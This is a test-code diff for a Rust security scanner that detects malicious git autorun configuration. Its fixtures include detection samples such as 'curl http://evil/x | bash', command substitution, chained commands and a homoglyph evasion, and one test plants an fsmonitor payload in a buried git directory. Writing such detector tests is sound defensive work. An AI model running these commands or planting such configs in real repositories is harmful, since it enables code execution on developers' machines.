@@ -331,6 +331,7 @@ fn summary_counts_match_vector_lengths() {
         transcripts: vec![],
         marketplaces: vec![],
         vscode_tasks: vec![],
+        git_autorun_configs: vec![],
         warnings: vec![],
         summary: Summary {
             ai_agents_and_tools_count: 0, ai_frameworks_count: 0,
@@ -346,6 +347,7 @@ fn summary_counts_match_vector_lengths() {
             transcript_stores_count: 0,
             marketplaces_count: 0,
             vscode_autorun_tasks_count: 0,
+            git_autorun_configs_count: 0,
         },
     };
 
@@ -398,6 +400,7 @@ fn json_output_is_valid_json() {
         transcripts: vec![],
         marketplaces: vec![],
         vscode_tasks: vec![],
+        git_autorun_configs: vec![],
         warnings: vec![ScanWarning { scanner: "test".into(), message: "a warning".into() }],
         summary: Summary {
             ai_agents_and_tools_count: 0, ai_frameworks_count: 0,
@@ -413,6 +416,7 @@ fn json_output_is_valid_json() {
             transcript_stores_count: 0,
             marketplaces_count: 0,
             vscode_autorun_tasks_count: 0,
+            git_autorun_configs_count: 0,
         },
     };
     report.compute_summary();
@@ -462,6 +466,7 @@ fn html_output_no_script_injection() {
         transcripts: vec![],
         marketplaces: vec![],
         vscode_tasks: vec![],
+        git_autorun_configs: vec![],
         warnings: vec![],
         summary: Summary {
             ai_agents_and_tools_count: 0, ai_frameworks_count: 0,
@@ -477,6 +482,7 @@ fn html_output_no_script_injection() {
             transcript_stores_count: 0,
             marketplaces_count: 0,
             vscode_autorun_tasks_count: 0,
+            git_autorun_configs_count: 0,
         },
     };
     report.compute_summary();
@@ -3101,6 +3107,7 @@ fn make_test_report(customize: impl FnOnce(&mut rustmachineguard::models::ScanRe
         transcripts: vec![],
         marketplaces: vec![],
         vscode_tasks: vec![],
+        git_autorun_configs: vec![],
         warnings: vec![],
         summary: Summary {
             ai_agents_and_tools_count: 0, ai_frameworks_count: 0,
@@ -3115,6 +3122,7 @@ fn make_test_report(customize: impl FnOnce(&mut rustmachineguard::models::ScanRe
             transcript_stores_count: 0,
             marketplaces_count: 0,
             vscode_autorun_tasks_count: 0,
+            git_autorun_configs_count: 0,
         },
     };
     customize(&mut report);
@@ -3987,4 +3995,95 @@ fn browser_extension_catalog_rows_actually_match() {
             "a Chrome-store extension must still match when installed in {b}"
         );
     }
+}
+
+// ─── git autorun config (value-gated, scope-gated) ───
+
+#[test]
+fn git_attack_shape_stays_silent_on_ordinary_developer_config() {
+    use rustmachineguard::scanners::git_config::attack_shape;
+    // These are the values a normal machine is full of. Every one of them must be
+    // silent: flagging them reports git's own features as RCE and teaches users to
+    // ignore the tool. This list is the false-positive budget, written down.
+    for benign in [
+        "true", "false", "auto", "1", "0",           // git's built-in fsmonitor
+        ".husky/_",                                   // husky, set on every npm install
+        "git-lfs clean -- %f",                        // git-lfs
+        "git-lfs filter-process",
+        "delta", "less -FRX", "nvim", "code --wait",  // pagers / editors
+        "ssh -i ~/.ssh/id_ed25519 -o IdentitiesOnly=yes",
+        "/usr/lib/git-core/git-credential-libsecret", // OS keychain helper
+        "osxkeychain",
+        "jq .",                                       // a textconv filter
+        "exiftool",
+    ] {
+        assert_eq!(attack_shape(benign), None, "must not flag benign value {benign:?}");
+    }
+}
+
+#[test]
+fn git_attack_shape_catches_command_chaining_and_repo_scripts() {
+    use rustmachineguard::scanners::git_config::attack_shape;
+    // Attack-shaped: the value is a script, not one program with arguments.
+    for bad in [
+        "touch /tmp/PWNED; false",
+        "true && curl http://evil/x | bash",
+        "$(curl http://evil/x)",
+        "echo `id`",
+        "curl http://evil/x.sh | bash",
+        "./scripts/setup.sh",                 // runs content the repo itself ships
+        "../payload.sh",
+    ] {
+        assert!(attack_shape(bad).is_some(), "must flag attack-shaped value {bad:?}");
+    }
+    // Obfuscation is folded before matching, so a homoglyph does not evade the gate.
+    assert!(attack_shape("\u{0441}url http://evil/x | bash").is_some(), "homoglyph");
+}
+
+#[cfg(unix)]
+#[test]
+fn git_scanner_finds_buried_repo_payload_but_not_legitimate_settings() {
+    use rustmachineguard::scanners::Scanner;
+    use std::fs;
+    use std::process::Command;
+    let base = std::env::temp_dir().join(format!("rmg-gitcfg-{}", std::process::id()));
+    let _ = fs::remove_dir_all(&base);
+    let proj = base.join("proj");
+    fs::create_dir_all(&proj).unwrap();
+    let git = |args: &[&str], dir: &std::path::Path| {
+        Command::new("git").args(args).current_dir(dir)
+            .env("GIT_CONFIG_GLOBAL", "/dev/null").env("GIT_CONFIG_SYSTEM", "/dev/null")
+            .output().map(|o| o.status.success()).unwrap_or(false)
+    };
+    if !git(&["init", "-q"], &proj) {
+        return; // git unavailable — nothing to assert
+    }
+    // Legitimate settings that must stay silent.
+    git(&["config", "core.fsmonitor", "true"], &proj);
+    git(&["config", "core.hooksPath", ".husky/_"], &proj);
+    git(&["config", "filter.lfs.clean", "git-lfs clean -- %f"], &proj);
+    // A git directory BURIED in the tree carrying a payload (CVE-2026-45033 shape).
+    let buried = proj.join("vendor/thing");
+    fs::create_dir_all(buried.join("objects")).unwrap();
+    fs::create_dir_all(buried.join("refs")).unwrap();
+    fs::write(buried.join("HEAD"), "ref: refs/heads/main\n").unwrap();
+    fs::write(
+        buried.join("config"),
+        "[core]\n\trepositoryformatversion = 0\n\tworktree = ../../wt\n\tfsmonitor = \"touch /tmp/x; false\"\n",
+    )
+    .unwrap();
+    fs::write(
+        base.join(".claude.json"),
+        format!(r#"{{"projects": {{"{}": {{}}}}}}"#, proj.display()),
+    )
+    .unwrap();
+
+    let plat = rustmachineguard::platform::platform_for_home(base.clone());
+    let found = rustmachineguard::scanners::git_config::GitConfigScanner.scan(plat.as_ref());
+    assert_eq!(found.len(), 1, "exactly the payload, none of the legitimate settings: {found:?}");
+    assert!(found[0].nested, "the buried git dir is the dangerous case");
+    assert_eq!(found[0].key, "core.fsmonitor");
+    assert!(found[0].reason.contains("chains"), "reason: {}", found[0].reason);
+
+    let _ = fs::remove_dir_all(&base);
 }
